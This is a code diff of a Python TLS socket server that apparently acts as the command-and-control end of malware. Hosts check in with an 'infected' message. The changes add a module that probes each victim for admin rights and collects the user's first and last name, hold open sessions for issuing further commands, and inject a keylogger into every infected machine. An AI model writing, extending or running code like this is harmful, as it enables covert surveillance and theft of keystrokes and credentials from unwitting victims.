@@ -1,32 +1,61 @@
 import asyncio
-import aiofiles
 import ssl
 from classes.user import User
 from dataManager.dataManager import DataManager
 from dataManager.repository.userRepository import UserRepository
 import logging
 from modules.Keylogger import Keylogger
+from modules.Recognizer import Recognizer
+from app_state import AppState
 
 class SocketServer:
-    def __init__(self, host="0.0.0.0", port=4242, data_manager=None, certfile='certs/cert.pem', keyfile='certs/key.pem'):
+    def __init__(self, app_state: AppState, host="0.0.0.0", port=4242, certfile='certs/cert.pem', keyfile='certs/key.pem', lock:asyncio.Lock=None):
         self.host = host
         self.port = port
-        self.data_manager: DataManager = data_manager
-        self.user_repository: UserRepository = data_manager.user_repository
+        self.data_manager: DataManager = app_state.data_manager
+        self.user_repository: UserRepository = self.data_manager.user_repository
         self.certfile = certfile
         self.keyfile = keyfile
+        self.lock = app_state.lock
         self.keylogger = Keylogger(self.user_repository)
+        self.recognizer = Recognizer(self.user_repository)
 
     async def handle_client(self, reader: asyncio.StreamReader, writer : asyncio.StreamWriter):
 
         ip, port = writer.get_extra_info('peername')
-        logging.info(f"Connection received from {ip}\n")
-
 
         while True:
             data = await reader.read(4096)
-            logging.info(data)
+            logging.info("Received data from " + ip + " : " + data.decode())
             service, uuid, params = data.decode().split("|||") 
+            message = await self.route(service, uuid, params, reader, writer, ip, port)
+            if service == "infected":
+                await self.handle_known_client(self.user_repository.get_user(uuid))
+                break
+            if message == "[close]":
+                writer.close()
+                await writer.wait_closed()
+                break
+    
+    async def handle_known_client(self, user: User):
+        reader = user.reader
+        writer = user.writer
+        ip = user.ip
+        port = user.port
+        uuid = user.uuid
+        while True:
+            async with user.lock:
+                logging.info(f"Waiting for data from {ip}")
+                data = await reader.read(4096)
+            logging.info("Received data from " + ip + " : " + data.decode())
+            try:
+                service, uuid, params = data.decode().split("|||")
+            except ValueError:
+                logging.error(f"Invalid data received : {data}")
+                continue
+            if service == "pause":
+                await asyncio.sleep(0.1)
+                continue
             message = await self.route(service, uuid, params, reader, writer, ip, port)
             if message == "[close]":
                 writer.close()
@@ -37,8 +66,13 @@ class SocketServer:
 
     async def route(self, service, uuid, params, reader, writer, ip, port):
         if service == "infected":
-            self.user_repository.add_user(User(uuid, ip, port, reader, writer))
+            user = User(uuid, ip, port, reader, writer)
+            is_admin = await self.recognizer.check_is_admin(reader, writer)
+            user.is_admin = is_admin
+            user.first_name, user.last_name = (await self.recognizer.get_username(reader, writer)).values()
+            self.user_repository.add_user(user)
             await self.keylogger.inject(reader, writer, uuid)
+            logging.info(f"Keylogger sent to {ip}")
         elif service == "keylogger":
             await self.keylogger.action(params, uuid)
             return "[close]"
